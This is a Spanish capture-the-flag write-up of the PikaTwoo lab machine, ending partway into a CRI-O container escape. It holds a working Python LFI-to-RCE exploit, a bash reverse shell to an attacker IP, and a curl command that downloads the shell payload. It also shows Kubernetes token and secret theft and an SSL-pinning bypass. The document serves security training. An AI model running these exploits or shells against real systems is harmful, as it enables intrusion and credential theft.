

![1](</Writeups/Machines/PikaTwoo/img/logo.png>)
By Rug4lo

## Reconocimiento

Primero que todo vamos a empezar con el escaneo básico de nmap 
```bash
 nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oN allPorts2 10.10.11.199
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-12 19:39 CEST
Initiating SYN Stealth Scan at 19:39
Scanning 10.10.11.199 [65535 ports]
Discovered open port 443/tcp on 10.10.11.199
Discovered open port 22/tcp on 10.10.11.199
Discovered open port 80/tcp on 10.10.11.199
Discovered open port 8080/tcp on 10.10.11.199
Discovered open port 35357/tcp on 10.10.11.199
Discovered open port 5672/tcp on 10.10.11.199
Discovered open port 4369/tcp on 10.10.11.199
Discovered open port 5000/tcp on 10.10.11.199
Discovered open port 25672/tcp on 10.10.11.199
Completed SYN Stealth Scan at 19:39, 16.56s elapsed (65535 total ports)
Nmap scan report for 10.10.11.199
Host is up, received user-set (0.36s latency).
Scanned at 2023-10-12 19:39:12 CEST for 17s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
443/tcp   open  https        syn-ack ttl 63
4369/tcp  open  epmd         syn-ack ttl 63
5000/tcp  open  upnp         syn-ack ttl 63
5672/tcp  open  amqp         syn-ack ttl 63
8080/tcp  open  http-proxy   syn-ack ttl 63
25672/tcp open  unknown      syn-ack ttl 63
35357/tcp open  openstack-id syn-ack ttl 63
```
Ahora vamos a usar los scripts básicos de reconocimiento para ver mas información de estos puertos
```bash
nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 10.10.11.199 -oN Targeted
```
```bash
# Nmap 7.93 scan initiated Thu Oct 12 19:02:07 2023 as: nmap -sCV -p22,80,443,4369,5000,5672,8080,25672,35357 -oN Targeted 10.10.11.199
WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.11.199
Host is up (0.24s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 f3922dfd8422d78df6b09e788eb93be7 (RSA)
|   256 01e43ec06643df25af8a71b83906df9f (ECDSA)
|_  256 4fec39764e719471befa7ffaa6a81674 (ED25519)
80/tcp    open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Pikaboo
|_http-cors: HEAD GET POST PUT DELETE PATCH
443/tcp   open  ssl/http nginx 1.18.0
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK
| Not valid before: 2021-12-29T20:33:08
|_Not valid after:  3021-05-01T20:33:08
| tls-alpn: 
|_  http/1.1
|_http-server-header: APISIX/2.10.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-nextprotoneg: 
|_  http/1.1
4369/tcp  open  epmd     Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
5000/tcp  open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-195255c3-658b-44fc-ae95-c602a1893b72
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 300 MULTIPLE CHOICES
|     Content-Type: application/json
|     Location: http://pikatwoo.pokatmon.htb:5000/v3/
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-10e3a45c-8a1f-46cc-82dc-94332d78de7d
|     {"versions": {"values": [{"id": "v3.14", "status": "stable", "updated": "2020-04-07T00:00:00Z", "links": [{"rel": "self", "href": "http://pikatwoo.pokatmon.htb:5000/v3/"
}], "media-types": [{"base": "application/json", "type": "application/vnd.openstack.identity-v3+json"}]}]}}
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-d0366dc1-c99b-4be6-b65e-a258c99ac306
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-55813e0c-ce41-4c9f-85df-6fd8e088f192
|   SIPOptions: 
|_    SIP/2.0 200 OK
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)
| amqp-info: 
|   capabilities: 
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@pikatwoo.pokatmon.htb
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com
|   platform: Erlang/OTP 23.2.6
|   product: RabbitMQ
|   version: 3.8.9
|   mechanisms: AMQPLAIN PLAIN
|_  locales: en_US
8080/tcp  open  http     nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
25672/tcp open  unknown
35357/tcp open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-title: Site doesn't have a title (application/json).
|_Requested resource was http://10.10.11.199:35357/v3/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=10/12%Time=65282698%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1DC,"HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:
SF:\x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:500
SF:0/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-10e3a4
SF:5c-8a1f-46cc-82dc-94332d78de7d\r\n\r\n{\"versions\":\x20{\"values\":\x2
SF:0\[{\"id\":\x20\"v3\.14\",\x20\"status\":\x20\"stable\",\x20\"updated\"
SF::\x20\"2020-04-07T00:00:00Z\",\x20\"links\":\x20\[{\"rel\":\x20\"self\"
SF:,\x20\"href\":\x20\"http://pikatwoo\.pokatmon\.htb:5000/v3/\"}\],\x20\"
SF:media-types\":\x20\[{\"base\":\x20\"application/json\",\x20\"type\":\x2
SF:0\"application/vnd\.openstack\.identity-v3\+json\"}\]}\]}}")%r(RTSPRequ
SF:est,AC,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVary:\x20X-Auth-Token\
SF:r\nx-openstack-request-id:\x20req-55813e0c-ce41-4c9f-85df-6fd8e088f192\
SF:r\n\r\n")%r(HTTPOptions,AC,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVa
SF:ry:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-d0366dc1-c99b-4be
SF:6-b65e-a258c99ac306\r\n\r\n")%r(FourOhFourRequest,180,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVar
SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-195255c3-658b-44fc
SF:-ae95-c602a1893b72\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\
SF:x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h
SF:1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\
SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>
SF:\n")%r(SIPOptions,12,"SIP/2\.0\x20200\x20OK\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 12 19:04:48 2023 -- 1 IP address (1 host up) scanned in 160.88 seconds
```
Podemos ver que tiene un par de subdominios, los cuales voy a añadir al /etc/hots

![1](</Writeups/Machines/PikaTwoo/img/1.png>)

Si hacemos un reconocimiento de directorios podremos ver alguna cosa interesante.

![1](</Writeups/Machines/PikaTwoo/img/2.png>)

Podemos también hacer un reconocimiento del puerto 8080, en el cual encontraremos un /info, que tendrá esta información

![1](</Writeups/Machines/PikaTwoo/img/3.png>)

Si nos metemos a la pagina principal, podemos clicar en uno de los monstruos

![1](</Writeups/Machines/PikaTwoo/img/4.png>)

Pero si entramos nos encontramos con este error:

![1](</Writeups/Machines/PikaTwoo/img/5.png>)

Si usamos Dustbuster para listar los directorios de la pagina principal, en donde encontraremos un CANGELOG, que si nos lo descargamos veremos esto:

![1](</Writeups/Machines/PikaTwoo/img/6.png>)

Con esto podemos ver que tiene una aplicación en android en beta

## Explotación del Keystone

Bien, una vez que hemos reunido esta información podemos ir a comprobar para que sirve el puerto 5000, que normalmente se usa para el servicio Keystone

Fuente --> https://docs.openstack.org/install-guide/firewalls-default-ports.html

Si indagamos en este servicio veremos que tiene una vulnerabilidad que nos puede ser de utilidad

CVE --> https://bugs.launchpad.net/keystone/+bug/1688137

Esto nos dice que si mandamos peticiones por post a /v3/auth/tokens con esa data podemos conseguir la token del usuario, para esto hay que mandar varias peticiones, por lo cual vamos hacernos un script en bash que nos automatize este proceso:

![1](</Writeups/Machines/PikaTwoo/img/7.png>)

Cuando lo ejecutemos veremos que en uno de los errores esta el token del usuario admin (recordando que en el script hemos puesto que de usuario sea el admin)

![1](</Writeups/Machines/PikaTwoo/img/8.png>)

Ahora que tenemos el id del usuario admin podemos usar ffuf para ver si hay mas usuarios, para esto usaremos una secuencia del 1 al 10 que definiremos en **F1** y como **F2** pondremos la lista de nombres a probar, en mi caso usare una lista de SecLists
```bash
./ffuf -u http://10.10.11.199:5000/v3/auth/tokens -H "Content-type: application/json" -w <(seq 0 10):F1,/opt/SecLists/Usernames/Names/names.txt:F2 -d '{ "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }' -ac
```
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.199:5000/v3/auth/tokens
 :: Wordlist         : F1: /proc/self/fd/12
 :: Wordlist         : F2: /opt/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/json
 :: Data             : { "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5623ms]
    * F1: 7
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5662ms]
    * F1: 8
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5725ms]
    * F1: 9
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 6345ms]
    * F1: 10
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms]
    * F1: 9
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms]
    * F1: 8
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4709ms]
    * F1: 5
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5355ms]
    * F1: 10
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5416ms]
    * F1: 7
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5471ms]
    * F1: 6
    * F2: andrew
```
Encontramos que hay un usuario llamado Andrew también.

Si nos ponemos a investigar en la pagina oficial veremos que este servicio suele usar un proxy llamado swift, en el cual podemos usar el usuario que hemos conseguido

![1](</Writeups/Machines/PikaTwoo/img/9.png>)

Probamos a hacer un curl a esta dirección y veremos que existe pero que no podemos acceder, esto nos deja saber que este directorio existe

![1](</Writeups/Machines/PikaTwoo/img/10.png>)

Viendo que ese directorio existe, podemos probar a listar los directorios de esta nueva ruta, a ver si tenemos algo interesante, por lo que voy a usar la herramienta Feroxbuster 

![1](</Writeups/Machines/PikaTwoo/img/11.png>)

## Descarga de la appp

Perfecto tenemos un /android, que junto a la información del CHANGELOG que hemos visto antes nos da la idea de que por ahí puede ir la explotación, si entramos a esta pagina veremos esto:

![1](</Writeups/Machines/PikaTwoo/img/12.png>)

Podemos descargarnos la apk con un wget 

![1](</Writeups/Machines/PikaTwoo/img/13.png>)

Ahora que tenemos la apk en nuestro equipo

podemos debugearla con este comando, para ver los archivos internos
```bash
apktool d pokatmon-app.apk
```
Con esto conseguiremos una carpeta con los archivos internos de la app, ahora podemos virtualizar el android, para probar la apk

Para esto usaremos Genymotion

![1](</Writeups/Machines/PikaTwoo/img/14.png>)

En mi caso ya tengo creado el móvil a virtualizar, pero para crearlo es simplemente darle al + y dejar todo por defecto, una vez que tengamos el Android corriendo podemos simplemente arrastrar el apk en el android para pasarle la apk

![1](</Writeups/Machines/PikaTwoo/img/15.png>)

Ahora si ejecutamos la app veremos algo interesante, nos pide un correo y un código, los cuales no tenemos

![1](</Writeups/Machines/PikaTwoo/img/16.png>)

## Reconocimiento de la app

Ya que todo esto esta corriendo en local podemos probar interceptando la peticion con Wireshark, veremos a donde esta tratando de mandar la solicitud (api.pokatmon-app.htb)

![1](</Writeups/Machines/PikaTwoo/img/17.png>)

Siendo ese el caso podemos intentar que nos mande a nosotros la peticion, modificando el /etc/hosts del android, para eso primero nos conectamos con abd, para tener una consola del movil
```bash
adb shell
```
Ahora usamos este comando
```bash
mount -o remount,rw /
```
Y modificamos el /etc/hosts con nuestra ip

![1](</Writeups/Machines/PikaTwoo/img/18.png>)

como ahora la peticion sera hacia nosotros, podemos interceptarla con burpsuite, creamos un proxy que escuche por el puerto 8443 (no me dejaba por el 443) y que como destino lleve al puerto 443 de la maquina de htb

![1](</Writeups/Machines/PikaTwoo/img/19.png>)

Y ahora redirigimos todas las peticiones que nos lleguen en el puerto 443 al 8443 para que pase por burpsuite, lo hacemos con este comando
```bash
socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:8443
```
Una vez tenemos todo esto, podemos ver que si enviamos la peticion en el android, no nos llega en el burpsuite, esto es debido a que la peticion usa un certificado ssl que nosotros no tenemos, pero como esta aplicación esta corriendo en local, esta usando unos certificados ssl que tiene guardados dentro de la app, por lo que podemos usar frida para buscarlos

## Bypass del certificado SSL con Frida

Para esto nos descargamos la version de frida --> https://github.com/frida/frida/releases (hay que descargar frida-server-16.1.4-android-x86_64)

Lo descomprimimos
```bash
7z X frida-server-16.1.4-android-x86_64.xz
```
Y le cambiamos el nombre 
```bash
mv frida-server-16.1.4-android-x86_64 frida-server
```
Ahora lo metemos en el móvil
```bash
adb push frida-server /data/local/tmp/
```
Vamos a hacerlo ejecutable
```bash
adb shell "chmod 755 /data/local/tmp/frida-server"
```
Y finalmente lo ejecutamos 
```bash
adb shell "/data/local/tmp/frida-server &"
```
Si todo esto esta bien hecho, podremos ejecutar este comando (dejando en segundo plano el anterior comando)
```bash
frida-ps -U
```
Ahora podemos ver todos los procesos que esta corriendo el móvil, con esto hecho podemos empezar a bypasear el ssl, para esto usaremos este script de frida

GitHub del script --> https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js

Creamos un archivo .js en nuestro equipo con el contenido del script
```bash
nvim flutter-disable-tls.js
```
Ahora ejecutamos este script después de cerrar la aplicación Pokatmon, para que nos la vuelva abrir pero si importarle el certificado ssl
```bash
frida -U -l flutter-disable-tls.js -f htb.pokatmon.pokatmon_app
```
Ahora si ponemos cualquier correo y código, podremos ver la peticion en burpsuite 

![1](</Writeups/Machines/PikaTwoo/img/20.png>)

## Bypass de la firma del certificado

Esta es la peticion de burpsuite 

![1](</Writeups/Machines/PikaTwoo/img/21.png>)

Si desencriptamos la firma, veremos que no tiene nada especial, es una básica, pero cuando estuvimos viendo los archivos de la apk vimos una llave publica y una privada

![1](</Writeups/Machines/PikaTwoo/img/22.png>)

Para firmar un certificado con estas claves podemos hacerlo así, directamente en base64 (el arroba tiene que estar sin url encodear):
```bash
openssl dgst -sha256 -sign private.pem <(echo -n "app_beta_mailaddr=hey@gmail.com'&app_beta_code=1234") | base64 -w 0 ; echo
```
Finalmente nos esta dando otra tipo de respuesta 

![1](</Writeups/Machines/PikaTwoo/img/23.png>)

## SQLI al loggin de la app

Ahora podemos intentar una inyección SQL (todo lo que cambies en el mensaje se tiene que firmar otra vez)

![1](</Writeups/Machines/PikaTwoo/img/24.png>)

Y nos da un email y un código!, si lo introducimos nos dara un error

![1](</Writeups/Machines/PikaTwoo/img/25.png>)

Para solucionar esto tenemos que modificar el /etc/hosts de el android

![1](</Writeups/Machines/PikaTwoo/img/26.png>)

Ahora si introducimos las credenciales, nos entrara a la app

![1](</Writeups/Machines/PikaTwoo/img/27.png>)

## Explotación de APISIX para conseguir la contraseña 

Aquí no tenemos nada, pero tenemos un correo, en la pagina principal había un apartado para recuperar la contraseña a traes del correo, si ponemos el correo y interceptamos al peticion con burpsuite, veremos que nos manda a un forbidden

![1](</Writeups/Machines/PikaTwoo/img/28.png>)

Si modificamos un poco la peticion, veremos que nos da un token

![1](</Writeups/Machines/PikaTwoo/img/29.png>)

Aunque aquí no podemos hacer nada, hay que recordar que tenemos el puerto 443 al que no podemos acceder, y si vemos los escaneos de nmap veremos que usa la version de APISIX/2.10.1

![1](</Writeups/Machines/PikaTwoo/img/30.png>)

Esta version tiene varias vulnerabilidades, una de ellas nos permite saltarnos la autenticacion de la API

CVE --> https://nvd.nist.gov/vuln/detail/CVE-2021-45232

Probando otras cosas vemos que si hacemos un freoxbuster al https de la pagina principal, nos da varios códigos de estado 403 para todo lo que contenga private 

![1](</Writeups/Machines/PikaTwoo/img/31.png>)

Podemos probar a hacer un curl, pero veremos que no tenemos acceso

![1](</Writeups/Machines/PikaTwoo/img/32.png>)

si hacemos otro feroxbuster dentro del directorio /private nos encontraremos algo bastante interesante (urlencodeando e ultimo carácter para que no nos lo bloquee)

![1](</Writeups/Machines/PikaTwoo/img/33.png>)

## Abuso del apartado Password Reset

Podemos acceder al /password-reset, desde burpsuite accedemos a este directorio, pero veremos el siguiente mensaje

![1](</Writeups/Machines/PikaTwoo/img/34.png>)

Si modificamos la peticion introduciendo el email, nos dará un token, muy parecido al que nos daba al intentar recuperar la contraseña.

![1](</Writeups/Machines/PikaTwoo/img/35.png>)

Si introducimos ese token en la peticion pasada a POST y le introducimos el token y la new password conseguiremos cambiarla al fin

![1](</Writeups/Machines/PikaTwoo/img/36.png>)

Ahora si nos logreamos con la nueva contraseña tendremos acceso a este panel 

![1](</Writeups/Machines/PikaTwoo/img/37.png>)

Si interceptamos la primera peticion veremos esto:

![1](</Writeups/Machines/PikaTwoo/img/38.png>)

Si le añadimos el debug nos dará otro tipo de error

![1](</Writeups/Machines/PikaTwoo/img/39.png>)

## Explotación del LFI

Según este post, es posible hacer un LFI

CVE --> https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/

La peticion seria la siguiente:

![1](</Writeups/Machines/PikaTwoo/img/40.png>)

## Paso de LFI a RCE usando nginx

Si buscamos por internet veremos que hay una manera de pasar el LFI a un RCE a través de nginx

Post --> https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/

Si usamos este script, seremos capaces de ejecutar comandos

```python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a'

# # find nginx worker processes 
# r  = requests.get(URL, params={
#     'file': '/proc/cpuinfo'
# })
# cpus = r.text.count('processor')
cpus = 2

# r  = requests.get(URL, params={
#     'file': '/proc/sys/kernel/pid_max'
# })
# pid_max = int(r.text)
# print(f'[*] cpus: {cpus}; pid_max: {pid_max}')
pid_max = 4194304

nginx_workers = []
for pid in range(pid_max):
    r  = requests.post(URL, 
            data={'region': f'../../proc/{pid}/cmdline'},
            cookies={"SESSa": "a"}
        )

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data='0xdf0xdf\n<?php system("id"); /*' + 16*1024*'A') ## Ejecucion del comando

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.post(URL, data={'region': f}, cookies={"SESSa": "a"})
            if r.text and "0xdf0xdf" in r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```

Modificando el comando a ejecutar seremos capaces de hacer un curl a nuestra propia maquina, y el resto ya es sencillo, creamos un archivo que contenga una reverse shell a nuestro equipo

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

Usamos el script para que nos haga una peticion a nuestro servidor http y que se descargue este archivo en el directorio /tmp

```bash
curl 10.10.14.6:8080/shell -o /tmp/shell
```

Después ejecutamos el script una vez mas, pero con el comando para ejecutar la shell (y nos ponemos en escucha por el puerto 4444)

```bash
bash /tmp/shell
```

Con esto tendremos acceso al usuario www

![1](</Writeups/Machines/PikaTwoo/img/41.png>)

Por el nombre del usuario nos podemos dar cuenta de que estamos en un contenedor (no tiene pinta de docker porque no hay una carpeta docker en la raiz), y si hacemos un cat a este archivito, veremos que estamos en un VMware

![1](</Writeups/Machines/PikaTwoo/img/42.png>)

Si nos metemos en el /sun/secrets veremos que tiene un kubernetes.io por lo que esta maquina esta corriendo kubernetes

![1](</Writeups/Machines/PikaTwoo/img/43.png>)

También nos encontramos un token 

![1](</Writeups/Machines/PikaTwoo/img/44.png>)

## Explotacion de Kubernetes y APISIX para salir del contenedor

Buscando sobre kubernetes me encontré este post, en el cual nos dice como bypasear la autenticacion del API de kubernetes

POST --> https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/

Por lo cual ejecutare estos comandos:
```bash
APISERVER=https://kubernetes.default.svc
```
```bash
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
```
```bash
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
```
```bash
TOKEN=$(cat ${SERVICEACCOUNT}/token)
```
```bash
CACERT=${SERVICEACCOUNT}/ca.crt
```
Ahora podemos hacer un curl a la api con el token que tenemos
```bash
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api ; echo
```
```bash
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.49.2:8443"
    }
  ]
}
```
También podemos listar los secretos de la pagina
```bash
 curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/$NAMESPACE/secrets
```
Esto nos dará dos keys
```bash
"APISIX_ADMIN_KEY": "YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=",
"APISIX_VIEWER_KEY": "OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg="
```
Gracias a todo esto, y a esta vulnerabilidad del APISIX, seremos capaces de ejecutar comandos

CVE --> https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/

Nos pasamos el chisel a la maquina victima y ejecutamos este comando en nuestra maquina (este proceso que vamos a hacer ahora es para poder ver la peticion en burpsuite, te lo puedes saltar si lo hacer solo con curl)
```bash
./chisel server --reverse --port 8081
```
ahora comprobamos que el puerto 9080 sea el de apisix-admin
```bash
curl apisix-admin:9080 -v
```
```bash
*   Trying 10.98.202.103:9080...
* Connected to apisix-admin (10.98.202.103) port 9080 (#0)
> GET / HTTP/1.1
> Host: apisix-admin:9080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Fri, 13 Oct 2023 23:27:37 GMT
< Content-Type: text/plain; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Server: APISIX/2.10.1
< 
{"error_msg":"404 Route Not Found"}
* Connection #0 to host apisix-admin left intact
```
viendo que es el puerto 9080 escribimos este comando en la maquina victima
```bash
./chisel client 10.10.14.7:8081 R:9080:apisix-admin:9080
```
Ahora tenemos hecho el port forwarding de ese Puerto a nuestra maquina, por lo que si hacemos un curl a este puerto tendremos respuesta
```bash
curl localhost:9080
```
```bash
{"error_msg":"404 Route Not Found"}
```
Todo esto es para poder usar el burpsuite, y que sea mas fácil mandar la peticion para el RCE, ahora desde burpsuite vamos a andar una peticion basada en esta pagina 

Pagina --> https://apisix.apache.org/docs/apisix/plugins/batch-requests/

Vamos a usar esto para crear un archivo que contenga una reverse shell, para conectarnos con la maquina principal, la peticion seria esta:

![1](</Writeups/Machines/PikaTwoo/img/45.png>)

Ahora hacemos un curl a esta nueva pagina que hemos creado, y nos ponemos en escucha, para verificar si nos hace una peticion

![1](</Writeups/Machines/PikaTwoo/img/46.png>)

Y recibimos la peticion, perfecto ahora podemos empezar a crear la peticion para la reverse shell, para esto usaremos un comando filter, el cual nos dejara ejecutar comandos en lua, para posteriormente indicarle de ejecutarlos en shell

![1](</Writeups/Machines/PikaTwoo/img/47.png>)

Una vez creada nos ponemos por escucha y le hacemos un curl a esta nueva pagina

![1](</Writeups/Machines/PikaTwoo/img/48.png>)

Ahora dentro, si nos ponemos a buscar credenciales veremos un config.yaml, el cual contiene las credenciales ssh de Andrew
```bash
cat /usr/local/apisix/conf/config.yaml
```

![1](</Writeups/Machines/PikaTwoo/img/49.png>)

Ahora podemos conectarnos con ssh con estas credenciales y obtener la user.txt

![1](</Writeups/Machines/PikaTwoo/img/50.png>)

## Escalada de privilegios

Ahora empieza la escalada de privilegios, podemos ver que en el /home hay otro usuario llamado Jennifer y en su home hay un archivo template.yaml
```bash
cat template.yaml 
```
```bash
apiVersion: v1
kind: Pod
metadata:
  name: template-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    imagePullPolicy: Never
```
También dentro de esta misma carpeta hay un .kube (lo cual nos da a saber que esta usando un Kubernetes) y dentro de este un config
```bash
 cat config
```
```bash
apiVersion: v1
clusters:
- cluster:
    certificate-authority: /home/jennifer/.minikube/ca.crt
    extensions:
    - extension:
        last-update: Fri, 18 Mar 2022 10:23:04 GMT
        provider: minikube.sigs.k8s.io
        version: v1.25.2
      name: cluster_info
    server: https://192.168.49.2:8443
  name: minikube
contexts:
- context:
    cluster: minikube
    user: jennifer
  name: jennifer-context
current-context: jennifer-context
kind: Config
preferences: {}
users:
- name: jennifer
  user:
    client-certificate: /home/jennifer/.minikube/profiles/minikube/jennifer.crt
    client-key: /home/jennifer/.minikube/profiles/minikube/jennifer.key
```
Podemos listar los "namespaces" de este config
```bash
kubectl --kubeconfig /home/jennifer/.kube/config get namespaces
```
```bash
NAME              STATUS   AGE
applications      Active   575d
default           Active   575d
development       Active   337d
kube-node-lease   Active   575d
kube-public       Active   575d
kube-system       Active   575d
```
Viendo que tenemos el config y el template.yaml podemos probar a crear un "pod" usando los namespaces que hemos listado antes (en mi caso me funciono con development)
```bash
kubectl --kubeconfig /home/jennifer/.kube/config create -f template.yaml -n development
```
```bash
pod/template-pod created
```
Podemos intentar listar los "pods" que hay en development, pero no nos dejara
```bash
kubectl --kubeconfig /home/jennifer/.kube/config get pods -n development
```
Si grepeamos por crio podemos ver la version de Kubernetes
```bash
grep -R crio
```
```bash
APIServerPort:8443 KubernetesVersion:v1.23.3
```
Esta version tiene una vulnerabilidad bastante reciente 

CVE --> https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/

Básicamente lo que nos dice esto es que todos los procesos de Kubernetes usan el mismo kernel, por lo que nos podemos aprovechar para inyectar comandos, primero vamos a irnos al /dev/shm (porque el /tmp se borra cada cierto tiempo), y vamos a crear dos archivos.

